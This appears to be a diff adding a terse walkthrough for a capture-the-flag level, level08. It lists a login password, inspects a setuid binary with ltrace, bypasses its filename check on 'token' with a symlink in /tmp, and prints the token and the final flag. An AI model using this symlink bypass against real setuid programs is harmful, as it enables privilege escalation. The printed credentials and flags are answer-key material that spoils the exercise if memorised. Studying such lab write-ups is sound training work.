@@ -1,0 +1,14 @@
+- Connect with login: "level08" and password: "fiumuikeil55xe9cu4dood66h"
+- ls -l <- setuid
+- ./level08
+	./level08 [file to read]
+- ./level08 token
+	You may not access 'token'
+- run with ltrace
+- strstr("token", "token")
+- ln -sf /home/user/level08/token /tmp/exploit
+- ./level08 /tmp/exploit
+	quif5eloekouj29ke0vouxean
+- connect to flag08
+- getflag
+	25749xKZ8L7DkSCwJkT9dyv6f
